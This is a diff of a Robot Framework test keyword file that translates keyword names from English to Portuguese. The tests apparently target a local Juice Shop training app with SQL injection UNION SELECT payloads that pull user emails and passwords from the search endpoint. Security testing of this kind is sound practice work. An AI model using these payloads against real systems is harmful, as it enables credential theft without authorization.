@@ -1,15 +1,15 @@
 *** Settings ***
 Resource    ../resource/settings.robot
 *** Keywords ***
-that I insert a malicious SQL into the search endpoint to return the user's credentials
+eu insiro um SQL malicioso no endpoint de busca para retornar as credenciais do usuário
     ${HEADER}=             Create Dictionary    Content-Type=application/json
     ${response}=    GET    url=http://localhost:3000/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--       expected_status=${config.status}    headers=${HEADER}    
     Set Global Variable    ${response}
-I inserted removing other data inserting something unusual at the beginning of the query
+eu insiro removendo outros dados e adicionando algo incomum no início da consulta
     ${HEADER}=             Create Dictionary    Content-Type=application/json
     ${response}=    GET    url=http://localhost:3000/rest/products/search?q=M')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--      expected_status=${config.status}    headers=${HEADER}    
     Set Global Variable    ${response}
-check if the response contains the credentials
+eu verifico se a resposta contém as credenciais
     ${json}=    Set Variable    ${response.json()}
 
     IF    'data' not in ${json}
